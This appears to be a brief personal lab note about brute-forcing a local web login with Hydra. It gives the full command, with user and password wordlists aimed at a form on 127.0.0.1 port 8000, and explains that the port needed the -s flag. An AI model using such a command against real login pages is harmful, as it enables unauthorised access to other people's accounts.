# Hydra Attack

### I used following command to attack the webpage: 
hydra -L user.txt -P password.txt 127.0.0.1 -s 8000 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect".
There is that one part, that made it possible for me to do it and it was: -s 8000.
I was using first 127.0.0.1:8000, but it did not work for me.
